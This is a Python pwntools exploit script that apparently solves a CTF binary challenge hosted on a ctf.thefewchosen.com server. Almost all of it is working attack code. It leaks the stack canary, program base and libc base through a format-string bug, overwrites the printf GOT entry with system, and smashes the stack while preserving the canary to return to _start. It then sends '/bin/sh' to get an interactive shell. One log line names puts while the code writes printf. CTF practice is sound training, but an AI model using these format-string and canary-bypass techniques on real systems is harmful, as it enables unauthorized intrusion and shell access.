from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF("./main")
libc = ELF("./libc.so.6")
rop = ROP("./main")

io = process("./main")
io = remote("01.linux.challenges.ctf.thefewchosen.com", 50428)
io.clean(timeout=1)

io.sendline(b"%33$p%37$p%35$p")
output = io.clean(timeout=1).split(b" ")[1].split(b"0x")[1:]
canary = int(output[0].decode(), 16)
log.success(f"canary = {hex(canary)}")
main_leak = int(output[1].decode(), 16)
log.success(f"main leak = {hex(main_leak)}")
main_base = main_leak - elf.sym.main
log.success(f"main base = {hex(main_base)}")
libc_leak = int(output[2].decode(), 16)
log.success(f"libc leak = {hex(libc_leak)}")
libc_base = libc_leak - 0x29d90
log.success(f"libc base = {hex(libc_base)}")

canary_offset = 200

log.info(f"writing {hex(libc_base + libc.sym.system)} to {hex(main_base + elf.got.puts)}")
fmt = fmtstr_payload(8, {
    (main_base + elf.got.printf): (libc_base + libc.sym.system)
}) 

canary_offset -= len(fmt)

io.sendline(
    fmt + \
    b"A" * (canary_offset) + \
    p64(canary) + \
    b"A" * 8 + \
    p64(main_base + elf.sym._start)
)

io.clean(timeout=1)
io.sendline(b"/bin/sh")

io.interactive()



